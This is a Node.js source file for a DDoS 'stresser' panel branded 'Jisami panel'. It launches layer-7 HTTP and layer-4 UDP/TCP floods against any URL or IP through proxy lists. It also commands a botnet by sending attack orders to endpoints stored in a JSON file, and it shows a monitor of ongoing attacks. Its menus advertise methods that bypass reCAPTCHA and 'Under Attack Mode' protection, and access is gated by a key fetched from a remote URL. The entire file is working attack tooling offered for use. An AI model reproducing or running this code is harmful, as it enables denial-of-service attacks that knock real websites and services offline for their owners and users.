const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const chalk = require('chalk');
const gradient = require('gradient-string');
const fs = require('fs')
const dns = require('dns');
const { promisify } = require('util');
const Table = require('cli-table3');
const os = require('os');
const fetch = require('node-fetch');
const figlet = require('figlet');
const whois = require('whois-json');
const axios = require('axios')
const path = require('path')
const version = '3.0.0'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
const settingsFile = './settings.json';

function loadSettings() {
    if (fs.existsSync(settingsFile)) {
        const data = fs.readFileSync(settingsFile, 'utf8');
        return JSON.parse(data);
    } else {
        return { name: 'Jisami panel', promptColor: '#ff69b4' }; 
    }
}

function saveSettings(settings) {
    fs.writeFileSync(settingsFile, JSON.stringify(settings, null, 2), 'utf8');
}

async function sett() {
    const settings = loadSettings();  
    const name = settings.name;

    const expiryDate = new Date('2025-03-01T00:00:00Z');
    const now = new Date();
    const diffInSeconds = (expiryDate - now) / 1000;
    const diffInMillennium = diffInSeconds / (1000 * 365.25 * 24 * 60 * 60);

    const username = os.userInfo().username;

    console.clear();

    console.log(`
${chalk.magenta('[')} ${chalk.white('System')} ${chalk.magenta(']:')} ${chalk.magenta('Welcome to')} ${chalk.red('Staries')} ${chalk.white('Control')} ${chalk.white(username)} ${chalk.magenta('enjoy stay here')}
`);

    const asciiArt = figlet.textSync(name, { font: 'Slant' });

    const screenWidth = process.stdout.columns || 80;

    const asciiLines = asciiArt.split('\n');

    const centeredLines = asciiLines.map(line => {
        const padding = ' '.repeat(Math.max(0, Math.floor((screenWidth - line.length) / 2)));
        return padding + line;
    });

    const coloredAsciiArt = centeredLines.map(line => gradient(['#800080', '#ff69b4'])(line)).join('\n');

    console.log(coloredAsciiArt);

    console.log(`
     ${chalk.red('Staries')} | Max Time [ ${chalk.red('550')} ] | Status [ ${chalk.red('Owner')} ] | VIP [ ${chalk.red('True')} ]
                    ${chalk.red(diffInMillennium.toFixed(10))} Millennium (s)

======================================================================
Please type "${chalk.red('help')}" or "${chalk.red('cls')}" and "${chalk.red('methods')}"
    `);
}

// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log('Starting bootup...');
    
    await exec('npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent');
    console.log('Dependencies installed successfully.');

    // Mengambil password dari file sigma.txt
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/Jisami panel740/sigma/refs/heads/main/skibidi.txt');
    const password = await secretBangetJir.text();
    console.log('Password fetched.');

    // Meminta input dari pengguna untuk key
    permen.question(`
  `, async (skibidi) => {
      if (skibidi === password.trim()) {
        await scrapeProxy();
        await scrapeUserAgent();
        console.log('\x1b[32mCorrect key\x1b[0m');
        await sleep(700);
        console.clear();
        console.log(`Welcome To Jisami panel Tools`);
        await sleep(1000);
        await sett();
        sigma();
      } else {
        console.log('Wrong Key');
        process.exit(-1);
      }
    });

  } catch (error) {
    console.log('Error during bootup:', error);
    process.exit(-1); 
  }
}
// [========================================] //

async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: srvattack <target> <duration> <methods>
botnet https://google.com 120 flood`);
        sigma();
        return;
    }
    const [target, duration, methods] = args;
    let result;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;
        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
        console.clear();
        console.log(`
${chalk.white.bold(`Type ${chalk.red.bold(`"cls"`)} to return to the menu`)}\n\n
${gradient('cyan', 'blue')("                   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ")}${chalk.white.bold("╔═╗╔═╗╔╗╔╔╦╗")}
${gradient('cyan', 'blue')("                   ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}${chalk.white.bold(" ╚═╗║╣ ║║║ ║")}
${gradient('cyan', 'blue')("                   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}${chalk.white.bold(" ╚═╝╚═╝╝╚╝ ╩")}
                            
${gradient('cyan', 'blue')('          ╚╦════════════════════════════════════════════╦╝')}
${gradient('cyan', 'blue')('     ╔═════╩════════════════════════════════════════════╩═════╗')}
${chalk.white.bold(`                       ATTACK HAS BEEN ${chalk.red.bold('STARTED!')}`)}
${chalk.white.bold(`             TARGET   : [ ${target} ]`)}
${chalk.white.bold(`             TIME     : [ ${duration} ]`)}
${chalk.white.bold(`             LAYER-7  : [ ${methods} ]`)}
${chalk.white.bold(`             VIP      : [ True ]`)}
${chalk.white.bold(`             USER     : [ ${os.userInfo().username}]`)}
${chalk.white.bold(`             CREDITS  : [ t.me/rJisami panel ]`)}
${chalk.white.bold(`             CREDITS  : [ t.me/rJisami panel ]`)}
${gradient('cyan', 'blue')('     ╚════════════════════════════════════════════════════════╝')}
`);
        sigma();
    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma();
    }
}

async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
add-botnet http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma();
            return;           
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
}

// [========================================] //
async function getIPFromURL(host) {
  return new Promise((resolve, reject) => {
    const hostname = new URL(host).hostname;
    dns.lookup(hostname, (err, address) => {
      if (err) {
        reject(`Error fetching IP for ${host}: ${err.message}`);
      } else {
        resolve(address);
      }
    });
  });
}

async function pushMonitor(target, methods, duration) {
  const startTime = Date.now();
  let ipAddress = 'Unknown';

  if (target.startsWith('http://') || target.startsWith('https://')) {
    try {
      ipAddress = await getIPFromURL(target);
    } catch (error) {
      console.error(chalk.red(`Error getting IP for ${target}: ${error}`));
    }
  } else {
    ipAddress = target;
  }

  processList.push({
    target: target,
    methods: methods,
    ipAddress: ipAddress,
    startTime: startTime,
    duration: duration
  });

  setTimeout(() => {
    const index = processList.findIndex(p => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}

async function displayMonitor() {
  if (processList.length === 0) {
    console.log(chalk.red("=== No ongoing attacks ==="));
    return;
  }

  console.log(chalk.green("=== Ongoing Attacks ===\n"));

  const table = new Table({
    head: ['#', 'HOST', 'SINCE', 'DURATION', 'METHOD'],
    colWidths: [5, 20, 10, 10, 8],
  });

  for (const [index, attack] of processList.entries()) {
    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
    table.push([
      index + 1,
      attack.ipAddress,
      `${elapsed} sec`,
      `${attack.duration} sec`,
      attack.methods || 'Unknown',
    ]);
  }

  console.log(table.toString());
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
    if (!args || args.length < 4) { 
        console.log("Usage: <method> <target> <port> <duration>");
        sigma();
        return;
    }

    const [urlTarget, port, duration, methods] = args;

    if (!urlTarget || !urlTarget.startsWith('http')) { 
        console.log(`Usage: <method> <target> <port> <duration>`);
        sigma();
        return;
    }

    if (isNaN(port) || parseInt(port) <= 0 || parseInt(port) > 443) { 
        console.log("Error: Add default port 443.");
        sigma();
        return;
    }

    if (isNaN(duration) || parseInt(duration) <= 0 || parseInt(duration) > 300) { 
        console.log("Error: Type the duration input according to the time limit");
        sigma();
        return;
    }

    try {
        let hostname;
        if (urlTarget.startsWith('http')) {
            const parsing = new URL(urlTarget);
            hostname = parsing.hostname;
        } else {
            hostname = urlTarget;
        }

        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        console.clear();
console.log(`
${chalk.white.bold(`Type ${chalk.red.bold(`"cls"`)} to return to the menu`)}\n\n
${gradient('cyan', 'blue')("                   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ")}${chalk.white.bold("╔═╗╔═╗╔╗╔╔╦╗")}
${gradient('cyan', 'blue')("                   ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}${chalk.white.bold(" ╚═╗║╣ ║║║ ║")}
${gradient('cyan', 'blue')("                   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}${chalk.white.bold(" ╚═╝╚═╝╝╚╝ ╩")}
                            
${gradient('cyan', 'blue')('          ╚╦════════════════════════════════════════════╦╝')}
${gradient('cyan', 'blue')('     ╔═════╩════════════════════════════════════════════╩═════╗')}
${chalk.white.bold(`                       ATTACK HAS BEEN ${chalk.red.bold('STARTED!')}`)}
${chalk.white.bold(`             TARGET   : [ ${urlTarget} ]`)}
${chalk.white.bold(`             TIME     : [ ${duration} ]`)}
${chalk.white.bold(`             PORT     : [ ${port} ]`)}
${chalk.white.bold(`             LAYER-7  : [ ${methods} ]`)}
${chalk.white.bold(`             VIP      : [ True ]`)}
${chalk.white.bold(`             USER     : [ ${os.userInfo().username}]`)}
${chalk.white.bold(`             CREDITS  : [ t.me/rJisami panel ]`)}
${gradient('cyan', 'blue')('     ╚════════════════════════════════════════════════════════╝')}
`);
    } catch (error) {
        console.log(`Oops Something Went Wrong`);
    }

    const metode = path.join(__dirname, `./lib/cache/${methods}`);

    if (methods === 'glory') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'flood') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration}`);
        sigma();
    } else if (methods === 'storm') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'thunder') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'bypass') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'quantum') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'tornado') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'browser') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'https') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'tls') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10`);
        sigma();
    } else if (methods === 'thspeed') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} 6 proxy.txt ${duration}`);
        sigma();
    } else if (methods === 'pidoras') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else if (methods === 'h2') {
        pushMonitor(urlTarget, methods, duration);
        exec(`screen -S dos -dm node ${metode} ${urlTarget} ${duration} 100 10 proxy.txt`);
        sigma();
    } else {
        console.log(`Method ${methods} not recognized for Layer 7`);
    }

    sigma();
}
//====================== LAYER 4 CONTROLLER ==================
async function handleAttackL4(args) {
  if (args.length < 4) {
    console.log(`Example: attackl4 <ip> <port> <duration> <method>`);
    sigma();
    return;
  }

  const [targetL4, port, durationL4, methodsL4] = args;

  if (parseInt(durationL4) > 300) {
    console.log(chalk.red("Error: Duration cannot exceed 300 seconds!"));
    sigma();
    return;
  }

  try {
    let hostnameL4;
    if (targetL4.startsWith('http')) {
      const parsing = new URL(targetL4);
      hostnameL4 = parsing.hostname;
    } else {
      hostnameL4 = targetL4;
    }

    const scrapeL4 = await axios.get(`http://ip-api.com/json/${hostnameL4}?fields=isp,query,as`);
    const resultL4 = scrapeL4.data;

    console.clear();
console.log(`
${chalk.white.bold(`Type ${chalk.red.bold(`"cls"`)} to return to the menu`)}\n\n
${gradient('cyan', 'blue')("                   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ ")}${chalk.white.bold("╔═╗╔═╗╔╗╔╔╦╗")}
${gradient('cyan', 'blue')("                   ╠═╣ ║  ║ ╠═╣║  ╠╩╗")}${chalk.white.bold(" ╚═╗║╣ ║║║ ║")}
${gradient('cyan', 'blue')("                   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩")}${chalk.white.bold(" ╚═╝╚═╝╝╚╝ ╩")}
                            
${gradient('cyan', 'blue')('          ╚╦════════════════════════════════════════════╦╝')}
${gradient('cyan', 'blue')('     ╔═════╩════════════════════════════════════════════╩═════╗')}
${chalk.white.bold(`                       ATTACK HAS BEEN ${chalk.red.bold('STARTED!')}`)}
${chalk.white.bold(`             TARGET   : [ ${targetL4} ]`)}
${chalk.white.bold(`             TIME     : [ ${durationL4} ]`)}
${chalk.white.bold(`             PORT     : [ ${port} ]`)}
${chalk.white.bold(`             LAYER-4  : [ ${methodsL4} ]`)}
${chalk.white.bold(`             VIP      : [ True ]`)}
${chalk.white.bold(`             USER     : [ ${os.userInfo().username}]`)}
${chalk.white.bold(`             CREDITS  : [ t.me/rJisami panel ]`)}
${gradient('cyan', 'blue')('     ╚════════════════════════════════════════════════════════╝')}
`);

  } catch (error) {
    console.log(`Oops Something Went wrong`);
  }

  const metodeL4 = path.join(__dirname, `./lib/cache/${methodsL4}`);

  //====================== LAYER 4 METHODS ====================
  if (methodsL4 === 'udp') {
    pushMonitor(targetL4, methodsL4, durationL4);
    exec(`screen -S dos -dm node ${metodeL4} ${targetL4} ${port} ${durationL4} 34`);
    sigma();
  } else if (methodsL4 === 'tcp') {
    pushMonitor(targetL4, methodsL4, durationL4);
    exec(`screen -S dos -dm node ${metodeL4} ${targetL4} ${port} ${durationL4} 34`);
    sigma();
  } else {
    console.log(`Method ${methodsL4} not recognized for Layer 4`);
  }
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
\x1b[0m
Created And Coded Full By Jisami panely

Thx To:
Rama NetRunner
Permen Md
`
const show = `\x1b[0m
                      ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗
                      ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗
                      ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝
╔═══════════════════════════════════════════════════════════╗
\x1b[30;47mL A Y E R 7\x1b[0m│\x1b[31m[GLORY] [TARGET] [PORT] [TIME]
\x1b[31m♦\x1b[0m FLOOD       │ Flooding Request With Http2
\x1b[31m♦\x1b[0m STORM       │ High Rps Bypass Non Protect
\x1b[31m♦\x1b[0m TLS         │ Bypass Protect Website
\x1b[31m♦\x1b[0m HTTPS       │ Good For Non Ssl Target
\x1b[31m♦\x1b[0m BYPASS      │ Bypass Recaptcha With Good Header
\x1b[31m♦\x1b[0m THUNDER     │\x1b[36m(VIP)\x1b[0m Flood Request With Http
\x1b[31m♦\x1b[0m PIDORAS     │\x1b[36m(VIP)\x1b[0m Bypass Under Attack Mode
\x1b[31m♦\x1b[0m H2          │\x1b[36m(VIP)\x1b[0m Good requests on HTTP/HTTP2
\x1b[31m♦\x1b[0m THSPEED     │\x1b[36m(ADMIN)\x1b[0m Best Methods
\x1b[30;47mL A Y E R 4\x1b[0m│\x1b[31m[UDP] [TARGET] [PORT] [TIME]\x1b[0m

\x1b[31m♦\x1b[0m TCP         │\x1b[36m(VIP)\x1b[0m Attack Ip For Game
\x1b[31m♦\x1b[0m UDP         │ Attack Ip For Game,Dstat
╚═══════════════════════════════════════════════════════════╝
`


permen.question(
  '\x1b[47m\x1b[31mJisami panel | V3\x1b[0m \x1b[1m\x1b[36m> ', 
  (input) => {
    const [command, ...args] = input.trim().split(/\s+/);
    
if (command === 'help') {
console.log('\x1b[0m');
    console.log(`
NAME       │ ALIAS            │ DESCRIPTION
───────────┼──────────────────┼─────────────────────────────────
Methods    │ ---              │ Show methods L7/4
srvmenu    │ ---              │ Show menu botnet
Monitor    │ ---              │ Show ongoing attack monitor
Credits    │ ---              │ Show creator of these tools
Cls        │ Clear            │ Clear terminal screen
Show       │ See,Methods      │ Category and information
Scrape     │ Get proxy        │ Find other proxies
Sett       │ Change Ascii     │ Change text ascii theme
Exit       │ ---              │ Exit the controller
`);
    sigma();
  } else if (command === 'srvmenu') {
  console.log('\x1b[0m');
    console.log(`
[=========================================]
|| srvattack  || Attack with Server
|| testsrv    ||  Checking Your Server
|| addsrv     || Add Server
[=========================================]
- Glory (VIP)   ||
- Strom         ||
- Bypass        ||
- Tls           ||
- Thspeed       ||
- H2            ||
- Thunder       ||
- Flood         ||
[=========================================]
`);
    sigma();
  } else if (command === 'methods') {
  console.log('\x1b[0m');
    console.log(`

NAME       │ DESCRIPTION                                 │ DURATION
───────────┼─────────────────────────────────────────────┼────────────
glory      │ Layer 7 - Attack URL [Best]                 │ 300
h2         │ Layer 7 - Attack URL [Best]                 │ 300
flood      │ Layer 7 - Attack URL [Best]                 │ 300
storm      │ Layer 7 - Attack URL [Standard]             │ 300
tornado    │ Layer 7 - Attack URL [Normal]               │ 300
quantum    │ Layer 7 - Attack URL [Normal]               │ 300
browser    │ Layer 7 - Attack URL [Normal]               │ 300
thunder    │ Layer 7 - Attack URL [Normal]               │ 300
https      │ Layer 7 - Attack URL [Normal]               │ 300
bypass     │ Layer 7 - Attack URL [Normal]               │ 300
tls        │ Layer 7 - Attack URL [Normal]               │ 300
pidoras    │ Layer 7 - Attack URL [Best]                 │ 300
thspeed    │ Layer 7 - Attack URL [Best]                 │ 300
udp        │ Layer 4 - Attack Ip port [Normal]           │ 300
tcp        │ Layer 4 - Attack Ip port [Normal]           │ 300
`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
} else if (['tls', 'h2', 'glory', 'flood', 'pidoras', 'thunder', 'bypass', 'storm', 'thspeed', 'https', 'quantum', 'browser', 'tornado'].includes(command)) {
  handleAttackCommand([args[0], args[1], args[2], command]);
} else if (['tcp', 'udp'].includes(command)) {
  if (args.length < 3) {
    console.log(`Example usage: <methods> <ip> <port> <duration>`);
    sigma();
    return;
  }

  const target = args[0];
  const port = args[1];
  const duration = args[2]; 
  handleAttackL4([target, port, duration, command]); 
  } else if (command === 'monitor') {
  displayMonitor();
    sigma();
  } else if (command === 'sett') {
    const name = args[0] || 'Jisami panel-Stresser'; 
    const settings = loadSettings();
    settings.name = name;
    saveSettings(settings);
    sett();
    sigma();
  } else if (command === 'clear') {
      sett()
    sigma()
  } else if (command === 'scrape') {
    exec('node ./tools/scrape.js', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    
    sigma(); 
  } else if (command === 'exit') {
  process.exit(-1)
  } else if (command === 'show') {
   console.log(`${show}`);
   sigma();
       } else if (command === 'addsrv') {
    processBotnetEndpoint(args)
    sigma();
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
    sigma();
  } else if (command === 'srvattack') {
    AttackBotnetEndpoints(args) 
    sigma();
  } else if (command === 'cls') {
    sett()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()